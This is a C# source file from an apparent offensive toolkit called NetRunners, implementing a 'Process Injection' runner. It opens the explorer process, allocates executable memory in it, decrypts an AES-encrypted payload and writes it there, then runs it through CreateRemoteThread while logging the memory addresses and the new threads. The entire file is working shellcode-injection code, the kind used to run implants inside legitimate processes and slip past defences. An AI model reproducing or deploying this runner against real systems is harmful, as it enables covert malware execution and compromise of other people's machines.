using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    public class ProcessInjectionRunner : IRunner
    {
        public void Run()
        {
            string techniqueName = "Process Injection";
            string targetProcess = "explorer";                       // suffix needed
            byte[] buf;
            IntPtr hProcess = default;
            Process[] targetPid = Process.GetProcessesByName(targetProcess);
            int processID = 0;
            bool IsRemote32BitProcess = false;

            PrintTechniqueInfo(techniqueName, targetProcess);

            foreach (Process process in targetPid)
            {
                //Open remote process
                processID = process.Id;
                hProcess = OpenProcess(0x001F0FFF, 0, (uint)process.Id);
                IsWow64Process(hProcess,out IsRemote32BitProcess);
            }

            //Allocate space
            int sBuf = SelectPayloadSize(IsRemote32BitProcess);
            IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // to-do use exec_read then change protect with virtualprotect

            var allocAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
            UInt64 number = UInt64.Parse(allocAddress); // String -> Int
            string allocAddressHex = number.ToString("x"); // Int -> Hex
            Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> "+processID+" on Mem.Address ->" + "0x"+allocAddressHex);

            // select and decrypt payload
            buf = SelectPayloadArchitecture();
            buf = DecryptBytesToBytesAes(buf, AesKey);

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    
                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("[+] Payload Address on this executable: " + "0x"+bufHex);

                }
            }
            IntPtr outSize;
            
            //Write to remote process
            WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
            Console.WriteLine("[+] Payload has been written to the buffer!");

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach(ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }   
            }
        }
    }
}
